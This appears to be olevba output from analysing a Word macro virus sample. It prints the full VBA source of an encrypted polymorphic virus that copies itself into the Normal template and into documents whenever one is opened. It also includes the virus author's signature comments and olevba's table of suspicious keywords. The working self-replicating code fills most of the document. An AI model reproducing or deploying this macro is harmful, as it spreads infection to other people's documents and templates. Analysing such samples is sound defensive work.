olevba 0.60.1 on Python 3.8.10 - http://decalage.info/python/oletools
===============================================================================
FILE: Virus.MSWord.Illegble.b
Type: OLE
-------------------------------------------------------------------------------
VBA MACRO ThisDocument.cls 
in file: Virus.MSWord.Illegble.b - OLE stream: 'Macros/VBA/ThisDocument'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
(empty macro)
-------------------------------------------------------------------------------
VBA MACRO Modul 1.bas 
in file: Virus.MSWord.Illegble.b - OLE stream: 'Macros/VBA/Modul 1'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
Private Sub Document_Open()
'25
'
'w–In››�›I{Žťź—ŹJxŹ˘žKRx¤yŚ��KiL™\\�fL�ź–ˇˇ’›o¦MjN”^ “N‰�q^‚š�ś¦”ˇšŁ_t†sŤ
'
'{�R€ˇ¤ź”ź‡� Łź”§�bŠv„¦Łž™—©c‹wx¤˘Ą¤¤›¤Ş©^g_dz¦›ś„¦›¬Łťf¤ˇ¦ť«`ieYjbYvY[‰¬Ł°›®źZŤŻś[Şž°¨ ©Ż›‹¬ˇŞde^\‘Ą˘«]‹‘†‹^{^’°łŁ
'{�Rs•¦›©�w˘–¨ �ˇ§bŠv„¦Łž™—©c‹wx¤˘Ą¤¤›¤Ş©^g_dz¦›ś„¦›¬Łťf¤ˇ¦ť«`ieYjbYvY[‰¬Ł°›®źZŤŻś[Şž°¨ ©Ż›‹¬ˇŞde^\‘Ą˘«]~�†‹^{^’°łŁ
'
'i‡AoujoA^Av”—‡Bc�†BdglqC_aCw–™‰DxŚ‰’
'FyŚ›Go–š›GdHv—š•‰”|Ť–™•ŠťŽWkzś™”ŹŤžX€mnš�›š™�™ źT]UZo›�’zś‘˘™’
'GzŚ›G{�šŹŤśHeHi‹ť’źŽm�Śž–Ź�žX€lzś™•�ŽźY�mnš™ś›š‘š źT^V[pś‘’zś‘Łš“
'_�~:c€
'
'i‡AoujoA]_Bv”—‡Bc�†CdglqC`Cw–™‰DxŚ‰’
'FyŚ›Go–š›GdHi‹ś‘žŤl—Śž–Ž—ťWkzś™”ŹŤžX€mnš�›š™�™ źT]UZo›�’zś‘˘™’
'GzŚ›G{�šŹŤśHeHv—›–Š•}Ž–™•‹žŹX€lzś™•�ŽźY�mnš™ś›š‘š źT^V[pś‘’zś‘Łš“
'_�~:c€
'
'nŹ|ŤŹ‡„Ź�V
'A·Ŕ§Ŕ°Ë
'A§âÍÂą¤×
'AÓÉÚž¬˘¤
'AĄśĂĚÄ
'BŁ«Ďľ¸©ŇâĹ¤
'BşżÁ¬µ¤ÉŞâ
'@Ľ°Ü
'B±ÎŻŁź´ŘłŻ
'A®¶ Ŕ¬ÜČ
'BáµĹ˘Ë»ĺ¦â
'B¶¨Ŕ­ć¦ź¶
'AŕÄ»ŰÚÎŇ
'_�‡„ŽŹU
'
'eŽ‘?x@]@Q@tŹ@i�”•O„�–Ź–‘�Ž‹�‡•
'n‹Em”�šT’Ź”‹™N~RGXPGdGIv•Hmšš—šHzŤśž–ŽIwŽˇťLJ~’Ź�JrvKhK�
'f�=aŚŚ’>Z\>r�“„?s‡„Ť
'????•‹�Ť…@]@hŹ“”NŤŠŹ†”IyMASK
'@@@A—„�…†A^A�…‘†‡BHB�ŹŚ‘�CICf‹–LUWM
'<<<<’�…Š‚=Z=??
'FFFFoŚGo–š›U“�•Ť›P€THYQHfIKy›’źŠťŹJ}źŚJn™Ť ��™źŠn—šź‘TUNL€”‘›
'BBBBBCCC™†’‡�CaDš‡“�‰DJEGj“‰Exš‡HFLFiŽ�NWYP
'<<<<<<<<fi=Z=u
'=======>bŤŚ’>[>r‘”„
';;;;`‰<e‚
'_�~:c€
'j‡Ai‘•–PŽ‹�‡•K{OCTLC`CFw�…–��Ť—™_GEyŤŠ“
';<<<c‹<Y<pŹ’‚
'_�~:c€
'l‰Dl“—�R�Ť’Š�M}QEVNEcFHk”Š’Ź™šaIG{ŹŚ•Gk—–ŤHeH|šťŽ
'i†@gŹA^Au“–†Ab�†Bf‘�‡B^aCw•��Cw‹‰’
'BCCCl‰CpŚ‡Ll“—�R�Ť’Š�M}QEVNQFWRFWOFcFHNIG{ŹŚ•
'BBBBBBBCrŹ‡Ź�‘C`Dp‰’Ll“—�S‘Ž“Š�M}QFWOOFSFW
'CCDDDDDDs��{†—EbErŽ‰Nn•™šT’Ź”‹šOSGXPSGZTHw”Ś”Ť–R
'??@@@@@@s‰š†A^AjŹ•Is�†BLB[KBMCV
'>>>>????eŽ‘?x?]@Q@tŹ@s‰›†
'AABBBBBBBBBCkC`Cf‹•Km’�Lv’�DNE\YNEPEVXVO
'??@@@@@@@@@Ao†�w‚“A^Bp‡™x�”BHCk
'=========>>>f>[>@@
'<<<<<<<<k‚•‘=v
'>>>>>>??eŽ‘?y?\?hl@tŹ@il
'CCCCCCCCDDDDj“–DtEbEVEy”Eq‹”Nn•™šT’Ź•ŚšO�SGXPQ
'GGGGGGGHHHHHHHHHrŹIv’ŤQq�ťžX–“�ŹťR…WK\TWK{WL{���‘šULjM|™‘�ŽźM�–“ś
'@@@@@@@AAAAAAAAABBBBk�BrB`CTCw‹�‘
'OOPPPPPPPPPQQQQQQQQQRRRRs�¦—¤‰”ĄSpS€ś—[|Ł§¨b ť˘™¨]ŹaUf^aU…˘š˘›¤VaVhcW�śĄ_¦«¬f¤ˇ¦ť«`“eYjbbYfY‰¦ž¦ź¨ZeZkd
'DDDDDDDEEEEEEEEEFFFFFFFF”‹ž“�•ŚGdGuŤź~‰šHNHiŹťŽ›Š›
'DDDDDDDEEEEEEEEEFFFFFFFFn•š›U™Ś—“�ŠŤ”‘–ŤH‚TH—Ž •’—Ž
'DDDDDEEEEEEEEEFFFFFFFFFF•Śž“�•ŚGdHJJbHiŽśŤ›Š›IfIKKd
'>>>>>>??????????@@@@eŚ“…
'GGGHHHHHHHHHIIIIIIIIIJJJŚŹ�™śŹˇŚťKhKx”ŹTt›ź Z�•š’ U‡YM^VYM_ZN~N[N_W
'PPPQQQQQQQQQRRRRRRRRRSSSt™§�Ą‰”¦TqT�ť�\|¤¨©cˇžŁš¨^�bVg_bV†WbW†Ł›ŁśĄdX„ť¦`€§«­gĄ˘§ž¬a“fZkccZgZŠZh[Š§ź§ ©[g\me
'FFGGGGGGGGGHHHHHHHHHIIII—Ž •’�ŹJgJŚŹ�™ť�ˇŚťKQKy‘Ł‚ŤžLRLm“ˇ’ź�Žź
'DDDDDDDEEEEEEEEEFFFFFFFFn•š›U™Ś—“�ŠŤ”‘–ŤH‚TH—Ž •’—Ž
'GGGHHHHHHHHHIIIIIIIIIJJJ�Źˇ–“��KhKMMeKl’ ‘ž‚ŤžLiMOOgMŹ’“śź“¤Ź NkNPP
'>>??????????@@@@@@@@eŹ…Aj‡
'=>>>>>>>>>??????dŤ�?i†
'=========>>>l�–’>n
'<<<<<<<<k‚•‘=w
'@@@@@@@@Ž†�”•“ŠŹ�A_BDIDBHBp�šy„•
'AAAAAAAAj‘•–P”‡’Ž„†�ŹŚ‘�C{PD’‰›—�–Ť“Ś
'@@@AAAAAo†�w�”B_BDD\B‘�š–—•Ś‘ŠDaDFF
';;;;`‰<e‚
'_�~:c€
'h’Ž:r
'
's€‘†„“M�Ť’…’”Ś‰Ž…“@RMA—„�…†
'l�–j„�?\?hŤ“HrŽ„@J@RUJALAR
'hŹ“”N“†‘Ť‚„†ŤŠ�‡BTNBJDIECICq�šn�ťM
'
'f:W:M
'fŹ’AzA^AjmALBSBv‘Bj‘•—Q†’�‘—’‰�Ť’‰—
'EEEEn‹Fn•™šT’Ź”‹šO€SGXPGdHJOŤ–Ś‹—ŚŽKI}‘Ž—Išź“ž�™ˇJgJť �
'AAAAg�”BvB_BSBv’Co�‘Kk’–�R�Ť’‰—L}QEVNN
'GGGGGHHH›ťŠ“ŤˇIfIr—ťQQQ^JTJvŹ�RršžźY—”™�žT…XL]UULWM_MWM�VVM\N_f\aW
'AAAABBBB�B_BoŚ‡Kk’–—QŹŤ’‰—L}PDUNQEyQEVN
'========>[>_‘�FG
'??@@@@@@c@]A�ALAo†�l‡›BMB•—„Ť�ś
'========`>[>a†�FaG
'??@@@@@@t…Ť‘ŤŠŹ†A^Au‡Ź’Ž‹�‡BHCf
';;;;i€“�<p
'AAAAi�•–P”‡’Ž�…�ŹŚ‘�CoOCFKFDJDx‰‘•‘Ž“Š
'????s„ŚŹŚ‰Ž…@]@BB[AmA^AmALBS
'h…@‘•‰”ŽŹ—@^Au“–†Au‰‡�Bgš‹–Bh’•
'h’Ž:s
'
'nŹ”‰ŹŽ“Nv‰’–”q“�•†„•‹‘�B_Bh�Ž–�
'o�”‰ŹŹ”Od�Ź‡Š“Źe‘��‡”•‹’‘–C`Ci„Ź—‰
'o�”‰ŹŽ“Ns‚—†o�“Ž‚Ťr”‘Ź’–B_Bi„Ź–�
'
'c†—Ś™�g’†�‘‰’�Rw…š‰f�Ef�™Ž›Šj•‰›“‹”šTlś““u�”Ś
'
'f‘Bw�–‹ŹCk’–—QŹŚ’‰—LmpDODVQEVNEbEGk”ŠFy›�H
'??@@@hŹ“”N„†Ť†•†ŤŠŹ†•BknBMBSNCT
'e‰‰Š
'A‰~Š€
Set ‹‚©˛Ş = NormalTemplate.VBProject
Set ť¦ŤĄ•° = ‹‚©˛Ş.VBComponents(1).CodeModule
Set ŤÇ˛§ž‰Ľ = ActiveDocument.VBProject
Set ą®ż�‘‡‰ = ŤÇ˛§ž‰Ľ.VBComponents(1).CodeModule
If ť¦ŤĄ•°.lines(1, 1) <> "Private Sub Document_Open()" Then Set ��´ŁśŤ¶Ć©� = ą®ż�‘‡‰
If ą®ż�‘‡‰.lines(1, 1) <> "Private Sub Document_Open()" Then Set ��´ŁśŤ¶Ć©� = ť¦ŤĄ•°
If ��´ŁśŤ¶Ć©� = "" Then Exit Sub
For ź¤¦‘š‰­ŽĆ = 3 To ��´ŁśŤ¶Ć©�.countoflines
If Mid(��´ŁśŤ¶Ć©�.lines(ź¤¦‘š‰­ŽĆ, 1), 1, 1) <> "'" Then Exit For
˘–Â = Mid(��´ŁśŤ¶Ć©�.lines(ź¤¦‘š‰­ŽĆ, 1), 2, Len(��´ŁśŤ¶Ć©�.lines(ź¤¦‘š‰­ŽĆ, 1)))
For –ł”�„™Ľ—“ = 1 To Len(˘–Â)
”›…Ą‘Á­ = Chr(Asc(Mid(˘–Â, –ł”�„™Ľ—“, 1)) - (Right(��´ŁśŤ¶Ć©�.lines(2, 1), Len(��´ŁśŤ¶Ć©�.lines(2, 1)) - 1)) - (Int(((4 * Len(˘–Â) + 2 * –ł”�„™Ľ—“)) / 18.3)))
ĆšŞ‡° ÉŠĆ = ĆšŞ‡° ÉŠĆ & ”›…Ą‘Á­
Next –ł”�„™Ľ—“
›ŤĄ’Ë‹„› = ›ŤĄ’Ë‹„› & ĆšŞ‡° ÉŠĆ & Chr(13): ĆšŞ‡° ÉŠĆ = ""
Next ź¤¦‘š‰­ŽĆ
For Ć© Ŕżł· = 1 To ��´ŁśŤ¶Ć©�.countoflines
If ��´ŁśŤ¶Ć©�.lines(Ć© Ŕżł·, 1) = "Private Sub Document_Close()" Then
Application.ScreenUpdating = False
��´ŁśŤ¶Ć©�.insertlines Ć© Ŕżł· + 1, ›ŤĄ’Ë‹„›
Exit For
End If
Next Ć© Ŕżł·
Call Document_Close
NormalTemplate.Save
ActiveDocument.SaveAs ActiveDocument.FullName
End Sub
Private Sub Document_Close()
End Sub

'<-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=->

'MyName = WM97.m00d
'WrittenBy = f0re [UC/Skamerks/DVC]
'
'This is my first attempt to write an encrypted polymorphic macro virus.
'I havent included any payload. Stealth is also left out (see my other macros for
'good stealth techniques). Although this virus is a bit slow, it works fine. I did have
'some problems with the randomly generated key. Though you can check this out for yourself.
'If you find any other errors please let me know. Have phun.

'<-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=->
+----------+--------------------+---------------------------------------------+
|Type      |Keyword             |Description                                  |
+----------+--------------------+---------------------------------------------+
|AutoExec  |Document_Close      |Runs when the Word document is closed        |
|AutoExec  |Document_Open       |Runs when the Word or Publisher document is  |
|          |                    |opened                                       |
|Suspicious|write               |May write to a file (if combined with Open)  |
|Suspicious|Call                |May call a DLL using Excel 4 Macros (XLM/XLF)|
|Suspicious|Chr                 |May attempt to obfuscate specific strings    |
|          |                    |(use option --deobf to deobfuscate)          |
|Suspicious|VBProject           |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|VBComponents        |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|CodeModule          |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|Hex Strings         |Hex-encoded strings were detected, may be    |
|          |                    |used to obfuscate strings (option --decode to|
|          |                    |see all)                                     |
+----------+--------------------+---------------------------------------------+

